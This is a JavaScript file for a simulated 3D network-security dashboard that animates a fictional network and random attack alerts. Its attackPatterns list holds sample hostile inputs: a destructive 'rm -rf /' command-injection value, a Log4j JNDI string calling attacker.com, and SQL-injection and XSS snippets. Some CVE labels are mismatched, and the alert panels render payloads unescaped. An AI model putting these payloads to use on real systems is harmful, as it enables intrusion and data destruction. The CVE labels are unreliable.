// Global variables
let scene, camera, renderer, controls;
let nodes = {};
let connections = [];
let packets = [];
let animationId;
let isPaused = false;
let packetTrailsVisible = true;
let simulationSpeed = 1;
let selectedNode = null;
let selectedAlert = null;
let stats = {
    totalPackets: 0,
    threatsBlocked: 0,
    activeHosts: 0,
    attackRate: 0
};
let threatHistory = [];
let alerts = [];
let nodeIdCounter = 0;

// Network topology data
const networkData = {
    nodes: [
        { id: "router-1", type: "router", label: "Edge Router", ip: "198.51.100.1", data: ["internet-gateway"], position: { x: 0, y: 0, z: 0 } },
        { id: "fw-1", type: "firewall", label: "Perimeter FW", ip: "198.51.100.2", data: [], position: { x: 0, y: 0, z: 2 } },
        { id: "switch-1", type: "switch", label: "Core Switch", ip: "10.0.0.1", data: [], position: { x: 0, y: 0, z: 4 } },
        { id: "web-01", type: "server", label: "Web Server", ip: "10.0.1.10", data: ["public-website"], position: { x: -3, y: 0, z: 6 } },
        { id: "web-02", type: "server", label: "Web Server", ip: "10.0.1.11", data: ["public-website"], position: { x: 3, y: 0, z: 6 } },
        { id: "app-01", type: "server", label: "App Server", ip: "10.0.2.20", data: ["application-logic"], position: { x: -1.5, y: 0, z: 8 } },
        { id: "app-02", type: "server", label: "App Server", ip: "10.0.2.21", data: ["application-logic"], position: { x: 1.5, y: 0, z: 8 } },
        { id: "db-01", type: "storage", label: "DB Server", ip: "10.0.3.30", data: ["customers", "orders"], position: { x: 0, y: 0, z: 10 } },
        { id: "storage-01", type: "storage", label: "Storage SAN", ip: "10.0.4.40", data: ["backups", "archives"], position: { x: 0, y: 2, z: 8 } },
        { id: "wap-1", type: "wap", label: "WAP-Floor2", ip: "10.0.5.50", data: [], position: { x: -4, y: 0, z: 4 } },
        { id: "host-01", type: "host", label: "Workstation", ip: "10.0.6.60", data: [], position: { x: -5, y: 0, z: 6 } },
        { id: "host-02", type: "host", label: "Workstation", ip: "10.0.6.61", data: [], position: { x: -5, y: 0, z: 8 } }
    ],
    connections: [
        { source: "router-1", target: "fw-1" },
        { source: "fw-1", target: "switch-1" },
        { source: "switch-1", target: "web-01" },
        { source: "switch-1", target: "web-02" },
        { source: "web-01", target: "app-01" },
        { source: "web-02", target: "app-02" },
        { source: "app-01", target: "db-01" },
        { source: "app-02", target: "db-01" },
        { source: "db-01", target: "storage-01" },
        { source: "switch-1", target: "wap-1" },
        { source: "wap-1", target: "host-01" },
        { source: "wap-1", target: "host-02" }
    ]
};

// Attack patterns
const attackPatterns = [
    {
        type: "SQL Injection",
        cve: "CVE-2021-44228",
        payloadSnippet: "SELECT * FROM users WHERE id=' OR '1'='1';--",
        flags: "[SYN,ACK,PSH]",
        description: "SQL injection attempt via user input field"
    },
    {
        type: "DDoS",
        cve: null,
        payloadSnippet: "<high-rate-requests>",
        flags: "[SYN]",
        description: "Distributed denial of service attack"
    },
    {
        type: "Malware Delivery",
        cve: "CVE-2021-40444",
        payloadSnippet: "MSHTML::CMarkup::CreateElement()",
        flags: "[SYN,ACK,PSH,URG]",
        description: "Malicious payload delivery via browser exploit"
    },
    {
        type: "Phishing Attempt",
        cve: null,
        payloadSnippet: "http://malicious-site.com/login.php",
        flags: "[SYN,ACK]",
        description: "Phishing link detected in email traffic"
    },
    {
        type: "Command Injection",
        cve: "CVE-2021-43297",
        payloadSnippet: "127.0.0.1; rm -rf /",
        flags: "[SYN,ACK,PSH]",
        description: "OS command injection via web form"
    },
    {
        type: "RCE Attempt",
        cve: "CVE-2021-44228",
        payloadSnippet: "${jndi:ldap://attacker.com/exploit}",
        flags: "[SYN,ACK,PSH,URG]",
        description: "Remote code execution via Log4j vulnerability"
    },
    {
        type: "XSS",
        cve: "CVE-2020-26870",
        payloadSnippet: "<script>alert('XSS')</script>",
        flags: "[SYN,ACK,PSH]",
        description: "Cross-site scripting attack via user input"
    },
    {
        type: "Credential Stuffing",
        cve: null,
        payloadSnippet: "admin:password123",
        flags: "[SYN,ACK,PSH]",
        description: "Automated credential stuffing attack"
    },
    {
        type: "File Exfiltration",
        cve: null,
        payloadSnippet: "GET /sensitive-data.zip HTTP/1.1",
        flags: "[SYN,ACK,PSH]",
        description: "Unauthorized data access and exfiltration"
    }
];

// Malicious IPs for simulation
const maliciousIPs = [
    "203.0.113.45",
    "198.51.100.77",
    "192.0.2.123",
    "203.0.113.88",
    "198.51.100.99",
    "192.0.2.200",
    "203.0.113.101",
    "198.51.100.42"
];

// Initialize the scene
function init() {
    // Create scene
    scene = new THREE.Scene();
    scene.fog = new THREE.Fog(0x0a0a12, 10, 50);
    
    // Create camera
    const viewport = document.getElementById('network-viewport');
    camera = new THREE.PerspectiveCamera(
        75,
        viewport.clientWidth / viewport.clientHeight,
        0.1,
        1000
    );
    camera.position.set(0, 10, 15);
    camera.lookAt(0, 0, 5);
    
    // Create renderer
    renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
    renderer.setSize(viewport.clientWidth, viewport.clientHeight);
    renderer.setPixelRatio(window.devicePixelRatio);
    viewport.appendChild(renderer.domElement);
    
    // Add lights
    const ambientLight = new THREE.AmbientLight(0x333333);
    scene.add(ambientLight);
    
    const directionalLight = new THREE.DirectionalLight(0x00ffff, 0.5);
    directionalLight.position.set(0, 10, 5);
    scene.add(directionalLight);
    
    // Add grid
    const gridHelper = new THREE.GridHelper(20, 20, 0x00ffff, 0x004444);
    gridHelper.position.y = -2;
    scene.add(gridHelper);
    
    // Create network nodes
    createNetworkNodes();
    
    // Create connections
    createConnections();
    
    // Setup controls
    setupControls();
    
    // Setup event listeners
    setupEventListeners();
    
    // Initialize stats
    updateStats();
    
    // Start animation
    animate();
    
    // Start simulation
    startSimulation();
    
    // Update datetime
    updateDateTime();
    setInterval(updateDateTime, 1000);
    
    // Initialize threat timeline
    initThreatTimeline();
}

// Create network nodes
function createNetworkNodes() {
    networkData.nodes.forEach(nodeData => {
        let geometry, material, mesh;
        
        switch (nodeData.type) {
            case 'router':
                geometry = new THREE.BoxGeometry(1, 0.5, 1);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0x00ffff,
                    emissive: 0x00ffff,
                    emissiveIntensity: 0.2,
                    transparent: true,
                    opacity: 0.8
                });
                break;
            case 'firewall':
                geometry = new THREE.BoxGeometry(0.8, 1.2, 0.3);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0xff0040,
                    emissive: 0xff0040,
                    emissiveIntensity: 0.2,
                    transparent: true,
                    opacity: 0.8
                });
                break;
            case 'switch':
                geometry = new THREE.BoxGeometry(1.5, 0.3, 0.8);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0x9d4edd,
                    emissive: 0x9d4edd,
                    emissiveIntensity: 0.2,
                    transparent: true,
                    opacity: 0.8
                });
                break;
            case 'server':
                geometry = new THREE.BoxGeometry(0.8, 1.5, 0.8);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0x00ff88,
                    emissive: 0x00ff88,
                    emissiveIntensity: 0.2,
                    transparent: true,
                    opacity: 0.8
                });
                break;
            case 'storage':
                geometry = new THREE.CylinderGeometry(0.6, 0.6, 0.4, 16);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0x9d4edd,
                    emissive: 0x9d4edd,
                    emissiveIntensity: 0.2,
                    transparent: true,
                    opacity: 0.8
                });
                break;
            case 'wap':
                geometry = new THREE.ConeGeometry(0.5, 1, 8);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0xffbe0b,
                    emissive: 0xffbe0b,
                    emissiveIntensity: 0.2,
                    transparent: true,
                    opacity: 0.8
                });
                break;
            case 'host':
                geometry = new THREE.BoxGeometry(0.6, 0.8, 0.6);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0xa0a0b8,
                    emissive: 0xa0a0b8,
                    emissiveIntensity: 0.1,
                    transparent: true,
                    opacity: 0.8
                });
                break;
            default:
                geometry = new THREE.SphereGeometry(0.5, 16, 16);
                material = new THREE.MeshPhongMaterial({ 
                    color: 0x00ffff,
                    emissive: 0x00ffff,
                    emissiveIntensity: 0.2,
                    transparent: true,
                    opacity: 0.8
                });
        }
        
        mesh = new THREE.Mesh(geometry, material);
        mesh.position.set(nodeData.position.x, nodeData.position.y, nodeData.position.z);
        mesh.userData = nodeData;
        scene.add(mesh);
        
        // Add node label
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        canvas.width = 256;
        canvas.height = 64;
        
        context.fillStyle = 'rgba(0, 0, 0, 0.7)';
        context.fillRect(0, 0, canvas.width, canvas.height);
        
        context.font = '20px Orbitron';
        context.fillStyle = '#00ffff';
        context.textAlign = 'center';
        context.fillText(nodeData.label, canvas.width / 2, canvas.height / 2 + 7);
        
        const texture = new THREE.CanvasTexture(canvas);
        const spriteMaterial = new THREE.SpriteMaterial({ map: texture, transparent: true });
        const sprite = new THREE.Sprite(spriteMaterial);
        sprite.scale.set(2, 0.5, 1);
        sprite.position.set(nodeData.position.x, nodeData.position.y + 1.5, nodeData.position.z);
        scene.add(sprite);
        
        nodes[nodeData.id] = {
            mesh: mesh,
            sprite: sprite,
            data: nodeData,
            isAttacked: false
        };
    });
}

// Create connections between nodes
function createConnections() {
    networkData.connections.forEach(conn => {
        const sourceNode = nodes[conn.source];
        const targetNode = nodes[conn.target];
        
        if (sourceNode && targetNode) {
            const points = [];
            points.push(new THREE.Vector3(
                sourceNode.mesh.position.x,
                sourceNode.mesh.position.y,
                sourceNode.mesh.position.z
            ));
            points.push(new THREE.Vector3(
                targetNode.mesh.position.x,
                targetNode.mesh.position.y,
                targetNode.mesh.position.z
            ));
            
            const geometry = new THREE.BufferGeometry().setFromPoints(points);
            const material = new THREE.LineBasicMaterial({ 
                color: 0x00ffff,
                transparent: true,
                opacity: 0.5
            });
            
            const line = new THREE.Line(geometry, material);
            scene.add(line);
            
            connections.push({
                line: line,
                source: conn.source,
                target: conn.target,
                sourceNode: sourceNode,
                targetNode: targetNode,
                isAttacked: false
            });
        }
    });
}

// Setup controls for 3D scene
function setupControls() {
    let isDragging = false;
    let previousMousePosition = { x: 0, y: 0 };
    
    const viewport = document.getElementById('network-viewport');
    
    viewport.addEventListener('mousedown', (e) => {
        isDragging = true;
        previousMousePosition = { x: e.clientX, y: e.clientY };
    });
    
    viewport.addEventListener('mousemove', (e) => {
        if (isDragging) {
            const deltaMove = {
                x: e.clientX - previousMousePosition.x,
                y: e.clientY - previousMousePosition.y
            };
            
            const rotationSpeed = 0.005;
            
            // Rotate camera around the scene center
            const spherical = new THREE.Spherical();
            spherical.setFromVector3(camera.position);
            spherical.theta -= deltaMove.x * rotationSpeed;
            spherical.phi += deltaMove.y * rotationSpeed;
            spherical.phi = Math.max(0.1, Math.min(Math.PI - 0.1, spherical.phi));
            
            camera.position.setFromSpherical(spherical);
            camera.lookAt(0, 0, 5);
            
            previousMousePosition = { x: e.clientX, y: e.clientY };
        }
    });
    
    viewport.addEventListener('mouseup', () => {
        isDragging = false;
    });
    
    viewport.addEventListener('wheel', (e) => {
        e.preventDefault();
        
        const zoomSpeed = 0.1;
        const direction = new THREE.Vector3();
        camera.getWorldDirection(direction);
        
        if (e.deltaY < 0) {
            camera.position.addScaledVector(direction, -zoomSpeed);
        } else {
            camera.position.addScaledVector(direction, zoomSpeed);
        }
    });
    
    // Node selection
    viewport.addEventListener('click', (e) => {
        if (isDragging) return;
        
        const mouse = new THREE.Vector2();
        const rect = viewport.getBoundingClientRect();
        
        mouse.x = ((e.clientX - rect.left) / rect.width) * 2 - 1;
        mouse.y = -((e.clientY - rect.top) / rect.height) * 2 + 1;
        
        const raycaster = new THREE.Raycaster();
        raycaster.setFromCamera(mouse, camera);
        
        const meshes = Object.values(nodes).map(node => node.mesh);
        const intersects = raycaster.intersectObjects(meshes);
        
        if (intersects.length > 0) {
            const selectedMesh = intersects[0].object;
            selectNode(selectedMesh.userData.id);
        }
    });
}

// Setup event listeners
function setupEventListeners() {
    // Pause/Resume button
    document.getElementById('pause-btn').addEventListener('click', () => {
        isPaused = !isPaused;
        document.getElementById('pause-btn').innerHTML = isPaused ? '<span class="icon">▶</span>' : '<span class="icon">⏸</span>';
    });
    
    // Step button
    document.getElementById('step-btn').addEventListener('click', () => {
        if (isPaused) {
            simulateEvent();
        }
    });
    
    // Toggle packet trails
    document.getElementById('toggle-packets').addEventListener('click', () => {
        packetTrailsVisible = !packetTrailsVisible;
        document.getElementById('toggle-packets').style.opacity = packetTrailsVisible ? '1' : '0.5';
    });
    
    // Speed slider
    document.getElementById('speed-slider').addEventListener('input', (e) => {
        simulationSpeed = parseFloat(e.target.value);
    });
    
    // Close node details
    document.getElementById('close-node-details').addEventListener('click', () => {
        document.getElementById('node-details-content').innerHTML = '<div class="empty-state">Click a node to view details</div>';
        selectedNode = null;
    });
    
    // Close modal
    document.getElementById('close-modal').addEventListener('click', () => {
        document.getElementById('alert-modal').classList.remove('active');
    });
    
    // Window resize
    window.addEventListener('resize', () => {
        const viewport = document.getElementById('network-viewport');
        camera.aspect = viewport.clientWidth / viewport.clientHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(viewport.clientWidth, viewport.clientHeight);
    });
}

// Animation loop
function animate() {
    animationId = requestAnimationFrame(animate);
    
    if (!isPaused) {
        // Update packets
        updatePackets();
        
        // Animate nodes
        Object.values(nodes).forEach(node => {
            if (node.isAttacked) {
                node.mesh.material.emissiveIntensity = 0.5 + Math.sin(Date.now() * 0.005) * 0.3;
            }
        });
        
        // Animate connections
        connections.forEach(conn => {
            if (conn.isAttacked) {
                conn.line.material.opacity = 0.5 + Math.sin(Date.now() * 0.005) * 0.3;
                conn.line.material.color.setHex(0xff0040);
            } else {
                conn.line.material.opacity = 0.5;
                conn.line.material.color.setHex(0x00ffff);
            }
        });
    }
    
    renderer.render(scene, camera);
}

// Start simulation
function startSimulation() {
    // Initial stats
    stats.totalPackets = 1247;
    stats.threatsBlocked = 23;
    stats.activeHosts = networkData.nodes.filter(n => n.type === 'host' || n.type === 'server').length;
    stats.attackRate = 2.4;
    
    updateStats();
    
    // Generate normal packets
    setInterval(() => {
        if (!isPaused) {
            generateNormalPacket();
            stats.totalPackets += Math.floor(Math.random() * 5) + 1;
            updateStats();
        }
    }, 1000 / simulationSpeed);
    
    // Simulate events
    setInterval(() => {
        if (!isPaused) {
            simulateEvent();
        }
    }, 5000 / simulationSpeed);
}

// Generate normal packet
function generateNormalPacket() {
    if (connections.length === 0) return;
    
    const connection = connections[Math.floor(Math.random() * connections.length)];
    const isReversed = Math.random() > 0.5;
    
    const packet = {
        position: isReversed ? 
            new THREE.Vector3(
                connection.targetNode.mesh.position.x,
                connection.targetNode.mesh.position.y,
                connection.targetNode.mesh.position.z
            ) :
            new THREE.Vector3(
                connection.sourceNode.mesh.position.x,
                connection.sourceNode.mesh.position.y,
                connection.sourceNode.mesh.position.z
            ),
        target: isReversed ? connection.sourceNode : connection.targetNode,
        connection: connection,
        speed: 0.05 + Math.random() * 0.05,
        isMalicious: false,
        color: Math.random() > 0.5 ? 0x00ffff : 0x00ff88,
        size: 0.1 + Math.random() * 0.1
    };
    
    const geometry = new THREE.SphereGeometry(packet.size, 8, 8);
    const material = new THREE.MeshBasicMaterial({ 
        color: packet.color,
        transparent: true,
        opacity: 0.8
    });
    
    packet.mesh = new THREE.Mesh(geometry, material);
    packet.mesh.position.copy(packet.position);
    scene.add(packet.mesh);
    
    packets.push(packet);
}

// Simulate event (normal or malicious)
function simulateEvent() {
    // 70% chance of normal event, 30% chance of attack
    if (Math.random() < 0.7) {
        // Normal event - just update stats
        stats.attackRate = Math.max(0, stats.attackRate + (Math.random() - 0.5) * 0.5);
        updateStats();
        updateThreatTimeline(false);
    } else {
        // Attack event
        simulateAttack();
        stats.attackRate += Math.random() * 2 + 1;
        updateStats();
        updateThreatTimeline(true);
    }
}

// Simulate attack
function simulateAttack() {
    // Select random attack pattern
    const attackPattern = attackPatterns[Math.floor(Math.random() * attackPatterns.length)];
    
    // Select random target node
    const targetNodes = networkData.nodes.filter(node => 
        node.type === 'server' || node.type === 'storage' || node.type === 'host'
    );
    const targetNode = targetNodes[Math.floor(Math.random() * targetNodes.length)];
    
    // Select random malicious IP
    const sourceIP = maliciousIPs[Math.floor(Math.random() * maliciousIPs.length)];
    
    // Create alert
    const alert = {
        id: Date.now(),
        timestamp: new Date(),
        sourceIP: sourceIP,
        targetType: targetNode.type,
        targetId: targetNode.id,
        targetLabel: targetNode.label,
        targetData: targetNode.data.join(', '),
        attackType: attackPattern.type,
        cve: attackPattern.cve,
        payloadSnippet: attackPattern.payloadSnippet,
        flags: attackPattern.flags,
        description: attackPattern.description,
        confidence: Math.floor(Math.random() * 30) + 70, // 70-100%
        action: Math.random() > 0.3 ? 'Blocked' : 'Flagged'
    };
    
    // Add to alerts
    alerts.unshift(alert);
    if (alerts.length > 10) alerts.pop();
    
    // Update UI
    updateAlerts();
    
    // Show attack in 3D view
    showAttackIn3DView(targetNode.id);
    
    // Update stats
    if (alert.action === 'Blocked') {
        stats.threatsBlocked += 1;
    }
    updateStats();
    
    // Show modal for high confidence alerts
    if (alert.confidence >= 90) {
        setTimeout(() => {
            showAlertModal(alert);
        }, 500);
    }
}

// Show attack in 3D view
function showAttackIn3DView(targetNodeId) {
    const targetNode = nodes[targetNodeId];
    if (!targetNode) return;
    
    // Mark node as attacked
    targetNode.isAttacked = true;
    setTimeout(() => {
        targetNode.isAttacked = false;
    }, 5000);
    
    // Find connections to this node
    const targetConnections = connections.filter(conn => 
        conn.target === targetNodeId || conn.source === targetNodeId
    );
    
    // Mark connections as attacked
    targetConnections.forEach(conn => {
        conn.isAttacked = true;
        setTimeout(() => {
            conn.isAttacked = false;
        }, 5000);
    });
    
    // Generate malicious packets
    const numPackets = Math.floor(Math.random() * 5) + 3;
    for (let i = 0; i < numPackets; i++) {
        setTimeout(() => {
            generateMaliciousPacket(targetNodeId);
        }, i * 200);
    }
}

// Generate malicious packet
function generateMaliciousPacket(targetNodeId) {
    const targetNode = nodes[targetNodeId];
    if (!targetNode) return;
    
    // Find a connection to this node
    const targetConnections = connections.filter(conn => conn.target === targetNodeId);
    if (targetConnections.length === 0) return;
    
    const connection = targetConnections[Math.floor(Math.random() * targetConnections.length)];
    const sourceNode = connection.sourceNode;
    
    const packet = {
        position: new THREE.Vector3(
            sourceNode.mesh.position.x,
            sourceNode.mesh.position.y,
            sourceNode.mesh.position.z
        ),
        target: targetNode,
        connection: connection,
        speed: 0.08 + Math.random() * 0.04,
        isMalicious: true,
        color: 0xff0040,
        size: 0.15 + Math.random() * 0.1
    };
    
    const geometry = new THREE.SphereGeometry(packet.size, 8, 8);
    const material = new THREE.MeshBasicMaterial({ 
        color: packet.color,
        transparent: true,
        opacity: 0.9
    });
    
    packet.mesh = new THREE.Mesh(geometry, material);
    packet.mesh.position.copy(packet.position);
    scene.add(packet.mesh);
    
    packets.push(packet);
}

// Update packets position
function updatePackets() {
    for (let i = packets.length - 1; i >= 0; i--) {
        const packet = packets[i];
        
        // Move packet towards target
        const direction = new THREE.Vector3().subVectors(
            packet.target.mesh.position,
            packet.mesh.position
        ).normalize();
        
        packet.mesh.position.add(direction.multiplyScalar(packet.speed * simulationSpeed));
        
        // Check if packet reached target
        const distance = packet.mesh.position.distanceTo(packet.target.mesh.position);
        if (distance < 0.5) {
            // Remove packet
            scene.remove(packet.mesh);
            packets.splice(i, 1);
        }
    }
}

// Update stats display
function updateStats() {
    animateValue('total-packets', stats.totalPackets);
    animateValue('threats-blocked', stats.threatsBlocked);
    animateValue('active-hosts', stats.activeHosts);
    document.getElementById('attack-rate').textContent = stats.attackRate.toFixed(1) + '/min';
}

// Animate value changes
function animateValue(id, end) {
    const element = document.getElementById(id);
    const start = parseInt(element.textContent) || 0;
    const duration = 500;
    const startTime = performance.now();
    
    function update(currentTime) {
        const elapsed = currentTime - startTime;
        const progress = Math.min(elapsed / duration, 1);
        const value = Math.floor(start + (end - start) * progress);
        
        element.textContent = value;
        
        if (progress < 1) {
            requestAnimationFrame(update);
        }
    }
    
    requestAnimationFrame(update);
}

// Update alerts display
function updateAlerts() {
    const container = document.getElementById('alerts-container');
    container.innerHTML = '';
    
    document.getElementById('alert-count').textContent = alerts.length;
    
    alerts.forEach(alert => {
        const alertElement = document.createElement('div');
        alertElement.className = 'alert-item';
        alertElement.dataset.alertId = alert.id;
        
        alertElement.innerHTML = `
            <div class="alert-header">
                <div class="alert-type">${alert.attackType}</div>
                <div class="alert-time">${formatTime(alert.timestamp)}</div>
            </div>
            <div class="alert-details">
                <div>Source: <span class="alert-source">${alert.sourceIP}</span></div>
                <div>Target: ${alert.targetLabel}</div>
                <div>Confidence: ${alert.confidence}% | Action: ${alert.action}</div>
            </div>
        `;
        
        alertElement.addEventListener('click', () => {
            // Remove previous highlights
            document.querySelectorAll('.alert-item').forEach(el => {
                el.classList.remove('highlighted');
            });
            
            // Highlight this alert
            alertElement.classList.add('highlighted');
            
            // Show packet details
            showPacketDetails(alert);
            
            // Highlight node in 3D view
            highlightNode(alert.targetId);
            
            // Set as selected alert
            selectedAlert = alert;
        });
        
        container.appendChild(alertElement);
    });
}

// Show packet details
function showPacketDetails(alert) {
    const container = document.getElementById('inspector-content');
    document.getElementById('inspector-status').textContent = `Inspecting ${alert.attackType} attack`;
    
    container.innerHTML = `
        <div class="packet-detail">
            <span class="packet-label">Source IP:</span>
            <span class="packet-value">${alert.sourceIP}</span>
        </div>
        <div class="packet-detail">
            <span class="packet-label">Target IP:</span>
            <span class="packet-value">${networkData.nodes.find(n => n.id === alert.targetId).ip}</span>
        </div>
        <div class="packet-detail">
            <span class="packet-label">Attack Type:</span>
            <span class="packet-value">${alert.attackType}</span>
        </div>
        <div class="packet-detail">
            <span class="packet-label">Flags:</span>
            <span class="packet-value">${alert.flags}</span>
        </div>
        <div class="packet-detail">
            <span class="packet-label">Confidence:</span>
            <span class="packet-value">${alert.confidence}%</span>
        </div>
        <div class="packet-detail">
            <span class="packet-label">Action:</span>
            <span class="packet-value">${alert.action}</span>
        </div>
        ${alert.cve ? `
        <div class="packet-detail">
            <span class="packet-label">CVE:</span>
            <span class="packet-value">${alert.cve}</span>
        </div>
        ` : ''}
        <div class="packet-detail">
            <span class="packet-label">Payload:</span>
        </div>
        <div class="packet-payload">${alert.payloadSnippet}</div>
    `;
}

// Highlight node in 3D view
function highlightNode(nodeId) {
    const node = nodes[nodeId];
    if (!node) return;
    
    // Reset all nodes
    Object.values(nodes).forEach(n => {
        n.mesh.material.emissiveIntensity = 0.2;
    });
    
    // Highlight selected node
    node.mesh.material.emissiveIntensity = 0.8;
    
    // Reset after delay
    setTimeout(() => {
        node.mesh.material.emissiveIntensity = 0.2;
    }, 3000);
}

// Select node and show details
function selectNode(nodeId) {
    const nodeData = networkData.nodes.find(n => n.id === nodeId);
    if (!nodeData) return;
    
    selectedNode = nodeData;
    
    const container = document.getElementById('node-details-content');
    container.innerHTML = `
        <div class="node-detail">
            <span class="node-label">Name:</span>
            <span class="node-value">${nodeData.label}</span>
        </div>
        <div class="node-detail">
            <span class="node-label">Type:</span>
            <span class="node-value">${nodeData.type.toUpperCase()}</span>
        </div>
        <div class="node-detail">
            <span class="node-label">IP Address:</span>
            <span class="node-value">${nodeData.ip}</span>
        </div>
        <div class="node-detail">
            <span class="node-label">Data:</span>
            <span class="node-value">${nodeData.data.length > 0 ? nodeData.data.join(', ') : 'None'}</span>
        </div>
        <div class="node-detail">
            <span class="node-label">Status:</span>
            <span class="node-value">Online</span>
        </div>
        <div class="node-detail">
            <span class="node-label">Last Seen:</span>
            <span class="node-value">${new Date().toLocaleTimeString()}</span>
        </div>
        <div class="node-actions" style="margin-top: 10px;">
            <button class="modal-btn">Isolate</button>
            <button class="modal-btn block">Block Traffic</button>
        </div>
    `;
    
    // Highlight node
    highlightNode(nodeId);
}

// Show alert modal
function showAlertModal(alert) {
    const modal = document.getElementById('alert-modal');
    const modalBody = document.getElementById('modal-body');
    
    const targetNode = networkData.nodes.find(n => n.id === alert.targetId);
    
    modalBody.innerHTML = `
        <div class="modal-section">
            <div class="modal-detail">
                <span class="modal-label">Attack Type:</span>
                <span class="modal-value highlight">${alert.attackType}</span>
            </div>
            <div class="modal-detail">
                <span class="modal-label">Source IP:</span>
                <span class="modal-value highlight">${alert.sourceIP}</span>
            </div>
            <div class="modal-detail">
                <span class="modal-label">Target Asset:</span>
                <span class="modal-value">${alert.targetLabel} (${targetNode.ip})</span>
            </div>
            <div class="modal-detail">
                <span class="modal-label">Targeted Data:</span>
                <span class="modal-value">${alert.targetData || 'None'}</span>
            </div>
            <div class="modal-detail">
                <span class="modal-label">Confidence:</span>
                <span class="modal-value">${alert.confidence}%</span>
            </div>
            <div class="modal-detail">
                <span class="modal-label">Action Taken:</span>
                <span class="modal-value ${alert.action === 'Blocked' ? 'highlight' : ''}">${alert.action}</span>
            </div>
        </div>
        
        ${alert.cve ? `
        <div class="modal-section">
            <div class="modal-section-title">VULNERABILITY DETAILS</div>
            <div class="modal-detail">
                <span class="modal-label">CVE ID:</span>
                <span class="modal-value cve">${alert.cve}</span>
            </div>
            <div class="modal-detail">
                <span class="modal-label">Description:</span>
                <span class="modal-value">${alert.description}</span>
            </div>
        </div>
        ` : ''}
        
        <div class="modal-section">
            <div class="modal-section-title">PACKET ANALYSIS</div>
            <div class="modal-detail">
                <span class="modal-label">Flags:</span>
                <span class="modal-value">${alert.flags}</span>
            </div>
            <div class="modal-detail">
                <span class="modal-label">Payload Snippet:</span>
            </div>
            <div class="packet-payload">${alert.payloadSnippet}</div>
        </div>
        
        <div class="modal-actions">
            <button class="modal-btn block">Block Source IP</button>
            <button class="modal-btn block">Isolate Target</button>
            <button class="modal-btn">Add to Watchlist</button>
            <button class="modal-btn">False Positive</button>
        </div>
    `;
    
    modal.classList.add('active');
}

// Initialize threat timeline
function initThreatTimeline() {
    const canvas = document.getElementById('threat-timeline');
    const ctx = canvas.getContext('2d');
    
    // Initialize with some data
    for (let i = 0; i < 30; i++) {
        threatHistory.push(Math.random() > 0.7 ? 1 : 0);
    }
    
    drawThreatTimeline();
}

// Update threat timeline
function updateThreatTimeline(isThreat) {
    threatHistory.push(isThreat ? 1 : 0);
    if (threatHistory.length > 30) {
        threatHistory.shift();
    }
    
    drawThreatTimeline();
}

// Draw threat timeline
function drawThreatTimeline() {
    const canvas = document.getElementById('threat-timeline');
    const ctx = canvas.getContext('2d');
    
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    
    const barWidth = canvas.width / threatHistory.length;
    const maxHeight = canvas.height - 10;
    
    threatHistory.forEach((value, index) => {
        const height = value * maxHeight;
        const x = index * barWidth;
        const y = canvas.height - height;
        
        ctx.fillStyle = value ? '#ff0040' : '#00ff88';
        ctx.fillRect(x, y, barWidth - 1, height);
    });
}

// Format time
function formatTime(date) {
    return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

// Update datetime
function updateDateTime() {
    const now = new Date();
    const options = { 
        weekday: 'short', 
        year: 'numeric', 
        month: 'short', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    
    document.getElementById('datetime').textContent = now.toLocaleDateString('en-US', options);
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', init);